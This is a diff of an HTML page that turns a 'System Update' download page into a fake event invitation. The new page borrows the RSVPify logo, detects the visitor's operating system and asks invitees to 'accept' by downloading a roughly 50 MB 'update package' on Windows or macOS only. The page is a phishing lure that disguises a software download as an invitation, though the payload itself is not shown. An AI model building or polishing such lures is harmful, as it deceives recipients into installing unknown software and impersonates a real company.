@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="viewport" content="width=1024">
-    <title>System Update Available</title>
+    <title>You're Invited</title>
     <style>
         * {
             margin: 0;
@@ -14,7 +14,7 @@
 
         body {
             font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(135deg, #fafafa 0%, #f0f0f0 100%);
+            background: #f8f9fa;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -25,94 +25,115 @@
         .container {
             background: white;
             width: 100%;
-            max-width: 500px;
-            padding: 80px 50px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
+            max-width: 520px;
+            padding: 70px 60px;
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.1);
             text-align: center;
-            border: 1px solid rgba(0, 0, 0, 0.04);
+            border: 1px solid #e8e8e8;
+            border-radius: 8px;
         }
 
-        .seal {
-            font-size: 32px;
-            margin-bottom: 20px;
-            display: block;
+        .logo {
+            margin-bottom: 40px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 60px;
+        }
+
+        .logo img {
+            max-height: 50px;
+            max-width: 200px;
+            object-fit: contain;
+        }
+
+        .header-divider {
+            width: 60px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #0078d4, transparent);
+            margin: 0 auto 35px;
         }
 
         h1 {
-            font-size: 28px;
+            font-size: 32px;
             font-weight: 300;
             color: #1a1a1a;
-            margin-bottom: 8px;
-            letter-spacing: 0.5px;
-        }
-
-        .subtitle {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 50px;
-            font-weight: 300;
+            margin-bottom: 12px;
             letter-spacing: 0.3px;
         }
 
-        .divider {
-            width: 40px;
-            height: 1px;
-            background: #0078d4;
-            margin: 0 auto 40px;
-        }
-
-        .info {
-            background: transparent;
-            padding: 0;
-            margin-bottom: 50px;
-            border: none;
-            font-size: 13px;
-            color: #1a1a1a;
-            text-align: center;
-        }
-
-        .info-label {
-            display: block;
+        .subtitle {
+            font-size: 15px;
             color: #666;
+            margin-bottom: 40px;
             font-weight: 400;
-            margin-bottom: 6px;
-            font-size: 12px;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
+            line-height: 1.6;
         }
 
-        .info-value {
-            font-size: 16px;
-            color: #0078d4;
+        .event-details {
+            background: #f8f9fa;
+            padding: 30px;
+            border-radius: 6px;
+            margin-bottom: 40px;
+            text-align: left;
+        }
+
+        .event-detail-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            font-size: 14px;
+        }
+
+        .event-detail-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .event-label {
+            color: #666;
             font-weight: 500;
+            text-transform: uppercase;
+            font-size: 11px;
+            letter-spacing: 0.5px;
         }
 
-        .download-btn {
+        .event-value {
+            color: #0078d4;
+            font-weight: 600;
+            font-size: 15px;
+        }
+
+        .accept-btn {
             background: #0078d4;
             color: white;
             border: none;
-            padding: 14px 48px;
-            font-size: 14px;
-            font-weight: 500;
+            padding: 16px 52px;
+            font-size: 15px;
+            font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: all 0.3s ease;
             letter-spacing: 0.5px;
             text-transform: uppercase;
-            margin-bottom: 40px;
+            margin-bottom: 30px;
+            border-radius: 4px;
+            display: inline-block;
+            width: 100%;
+            max-width: 300px;
         }
 
-        .download-btn:hover {
+        .accept-btn:hover {
             background: #005a9e;
-            box-shadow: 0 4px 12px rgba(0, 120, 212, 0.25);
-            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(0, 120, 212, 0.3);
+            transform: translateY(-2px);
         }
 
-        .download-btn:active {
+        .accept-btn:active {
             background: #004578;
             transform: translateY(0);
         }
 
-        .download-btn:disabled {
+        .accept-btn:disabled {
             background: #ccc;
             cursor: not-allowed;
             box-shadow: none;
@@ -120,17 +141,21 @@
         }
 
         .footer {
-            font-size: 11px;
-            color: #999;
-            letter-spacing: 0.3px;
+            border-top: 1px solid #e8e8e8;
+            padding-top: 25px;
+            font-size: 12px;
+            color: #888;
             line-height: 1.8;
         }
 
-        .footer-divider {
-            width: 40px;
-            height: 1px;
-            background: #e0e0e0;
-            margin: 20px auto 20px;
+        .footer p {
+            margin-bottom: 6px;
+        }
+
+        .footer-note {
+            font-size: 11px;
+            color: #999;
+            margin-top: 12px;
         }
 
         @media (max-width: 768px) {
@@ -158,31 +183,43 @@
 </head>
 <body>
     <div class="container">
-        <span class="seal">📋</span>
-
-        <h1>You're Invited</h1>
-        <p class="subtitle">System Update 2.0.0</p>
-
-        <div class="divider"></div>
-
-        <div class="info">
-            <span class="info-label">Your System</span>
-            <span class="info-value" id="osDisplay">Detecting...</span>
+        <div class="logo">
+            <img src="https://rsvpify.com/wp-content/uploads/2025/08/Logo-RSVPify.svg" alt="RSVPify">
         </div>
 
-        <button class="download-btn" id="downloadBtn">Accept & Download</button>
+        <h1>You're Invited</h1>
+        <p class="subtitle">Join us for a special system update event</p>
+
+        <div class="header-divider"></div>
+
+        <div class="event-details">
+            <div class="event-detail-row">
+                <span class="event-label">📱 Your System</span>
+                <span class="event-value" id="osDisplay">Detecting...</span>
+            </div>
+            <div class="event-detail-row">
+                <span class="event-label">🎯 Update Version</span>
+                <span class="event-value">2.0.0</span>
+            </div>
+            <div class="event-detail-row">
+                <span class="event-label">📦 Package Size</span>
+                <span class="event-value">~50 MB</span>
+            </div>
+        </div>
+
+        <button class="accept-btn" id="downloadBtn">Accept Invitation</button>
 
         <div class="footer">
-            <div class="footer-divider"></div>
-            <p>Version 2.0.0</p>
-            <p style="margin-top: 4px;">Size: Approximately 50 MB</p>
+            <p>Confirm your attendance by downloading the update package</p>
+            <p>Ready to experience the latest features and improvements</p>
+            <p class="footer-note">This invitation is exclusively for your system type</p>
         </div>
     </div>
 
     <div class="mobile-warning">
         <div>
-            <p>Please use a desktop or laptop to download this update.</p>
-            <p style="margin-top: 20px; font-size: 14px; color: #737373;">This page is designed for Windows and macOS only.</p>
+            <p>Please use a desktop or laptop to accept this invitation.</p>
+            <p style="margin-top: 20px; font-size: 14px; color: #737373;">This event is designed for Windows and macOS systems only.</p>
         </div>
     </div>
 
